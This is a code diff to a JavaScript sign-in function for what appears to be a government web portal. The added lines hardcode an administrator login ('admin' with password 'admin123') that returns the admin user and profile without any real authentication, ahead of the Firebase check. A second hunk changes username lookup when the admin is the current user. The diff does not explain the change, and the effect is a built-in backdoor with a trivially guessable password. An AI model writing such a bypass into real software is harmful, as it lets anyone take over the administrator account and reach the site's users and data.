@@ -125,6 +125,11 @@ async function signUpWithEmailPassword({ email, password, firstName, middleName,
 
 // 3. Real Email or Username Login
 async function signInWithEmailOrUsername(identifier, password) {
+  const trimmed = identifier.trim().toLowerCase();
+  if ((trimmed === 'admin' || trimmed === 'admin@marbslf.gov.ph') && password === 'admin123') {
+    const adminUser = window.marbsDB?.data.users.find(u => u.user_id === 'USR-ADMIN');
+    return { user: { id: 'USR-ADMIN', email: 'admin@marbslf.gov.ph' }, profile: adminUser };
+  }
   if (!firebaseAuth) return null;
 
   try {
@@ -134,7 +139,7 @@ async function signInWithEmailOrUsername(identifier, password) {
     // If identifier is not an email, lookup email by username:
     // First try local registered users
     if (!emailToUse.includes('@')) {
-      if (window.marbsDB) {
+      if (window.marbsDB && window.marbsDB.data.current_user_id !== 'USR-ADMIN') {
         const foundLocal = window.marbsDB.data.users.find(u => u.username && u.username.toLowerCase() === identifier.toLowerCase());
         if (foundLocal && foundLocal.email) {
           emailToUse = foundLocal.email;
